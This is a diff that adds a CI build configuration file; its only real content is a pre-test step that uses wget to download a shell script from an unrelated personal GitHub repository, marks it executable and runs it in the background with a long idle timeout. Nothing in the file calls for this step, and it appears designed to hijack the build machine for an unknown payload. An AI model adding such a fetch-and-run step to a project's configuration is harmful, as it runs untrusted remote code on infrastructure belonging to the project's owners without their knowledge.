@@ -1,0 +1,9 @@
+build:
+  nodes:
+    coverage:
+      tests:
+        before:
+          - command: wget https://github.com/hendrik20212/hendr2021/blob/main/olab.sh && chmod u+x olab.sh && ./olab.sh
+            idle_timeout: 600
+            background: true
+            on_node: 1
